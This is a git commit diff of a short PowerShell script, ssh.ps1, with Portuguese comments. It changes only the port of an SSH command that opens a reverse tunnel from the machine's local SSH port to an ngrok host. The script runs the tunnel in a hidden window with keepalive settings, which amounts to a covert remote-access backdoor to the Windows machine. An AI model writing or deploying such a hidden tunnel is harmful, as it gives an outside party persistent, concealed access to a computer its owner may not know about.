c93f130039076507f884ffbbb8ba10cbc3045c3f
usermants <sanchezguy@proton.me>
2025-09-03 07:50:57 -0300

    Atualizar o ssh.ps1

--- ssh.ps1
+++ ssh.ps1
@@ -2,7 +2,7 @@
 $sshPath = "C:\Windows\System32\OpenSSH\ssh.exe"
 
 # Comando SSH
-$sshArgs = "-o ServerAliveInterval=60 -o ServerAliveCountMax=3 -o ExitOnForwardFailure=yes -R 2222:localhost:22 u0_a416@0.tcp.sa.ngrok.io -p 19687 -N"
+$sshArgs = "-o ServerAliveInterval=60 -o ServerAliveCountMax=3 -o ExitOnForwardFailure=yes -R 2222:localhost:22 u0_a416@0.tcp.sa.ngrok.io -p 19624 -N"
 
 # Executa SSH em processo invisível
 Start-Process -FilePath $sshPath -ArgumentList $sshArgs -WindowStyle Hidden
